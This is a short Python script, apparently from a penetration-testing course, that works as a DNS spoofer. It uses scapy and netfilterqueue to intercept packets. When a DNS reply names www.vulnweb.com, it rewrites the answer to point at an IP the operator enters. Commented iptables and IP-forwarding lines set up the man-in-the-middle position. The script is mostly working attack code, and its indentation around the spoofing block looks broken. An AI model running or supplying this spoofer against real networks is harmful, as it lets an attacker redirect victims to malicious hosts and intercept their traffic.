#!usr/bin/env python

import scapy.all as scapy
import subprocess
from colorama import Fore
import netfilterqueue

# subprocess.call("clear")
# subprocess.call("iptables --flush", shell=True)
# subprocess.call("iptables --table nat --flush", shell=True)
# subprocess.call("iptables --delete-chain", shell=True)
# subprocess.call("iptables --table nat --delete-chain", shell=True)
# subprocess.call("iptables -P FORWARD ACCEPT", shell=True)
# subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.vulnweb.com" in str(qname):
            print("[+] Spoofing target")
        # print(f"{Fore.LIGHTWHITE_EX}{scapy_packet.show()}")
    #packet.drop() #cuts the internet connection of the target machine.

            answer = scapy.DNSRR(rrname=qname, rdata=rdata_ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(bytes(scapy_packet))


    packet.accept()




logo = """

                                                                        
,------.  ,--.  ,--. ,---.       ,---.                        ,---.               
|  .-.  \ |  ,'.|  |'   .-'     '   .-'  ,---.  ,---.  ,---. /  .-' ,---. ,--.--. 
|  |  \  :|  |' '  |`.  `-.     `.  `-. | .-. || .-. || .-. ||  `-,| .-. :|  .--' 
|  '--'  /|  | `   |.-'    |    .-'    || '-' '' '-' '' '-' '|  .-'\   --.|  |    
`-------' `--'  `--'`-----'     `-----' |  |-'  `---'  `---' `--'   `----'`--'    
                                        `--'                                      
"""

print(f"\n{Fore.LIGHTWHITE_EX}{logo}\n")
print(
    f"{Fore.LIGHTWHITE_EX}[+]-[+]-[+]-[+]-[+]-[+]-[+]-[+]-[+]-[+]-[+]-[+]-[+]-[+]-[+]-[+]-[+]-[+]-[+]-[+]-[+] *** Created by:{Fore.LIGHTRED_EX} Totenkopf\n")
# pip3 install netfilterqueue (this will let us access the queue in our program)

rdata_ip = input(f"\n{Fore.LIGHTWHITE_EX} >>> Write the IP of your machine: ")

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)  # Number 0 comes from the iptables command that we run in the terminal
queue.run()
#subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0")  # This command will trap all the packets in a queue.
